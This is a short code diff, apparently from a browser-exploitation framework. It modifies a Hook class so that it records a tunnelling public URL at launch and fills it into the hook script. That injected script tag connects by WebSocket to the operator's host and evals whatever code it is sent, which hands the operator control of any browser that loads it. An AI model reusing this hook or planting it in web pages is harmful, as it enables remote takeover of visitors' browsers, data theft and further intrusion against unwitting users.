@@ -8,6 +8,12 @@ class Hook(BaseHook):
     VERSION = '0.1'
     TRANSPORT = 'websocket'
 
+    def __init__(self):
+        self._public_url = None
+
+    async def on_launched(self, environment):
+        self._public_url = environment.settings.tunneling.public_url
+
     @property
     def hook(self) -> str:
-        return "<script>c=new WebSocket('{{environment.public_url}}');c.onmessage=(e)=>eval(e.data);</script>"
+        return f"<script>c=new WebSocket('{self._public_url}');c.onmessage=(e)=>eval(e.data);</script>"
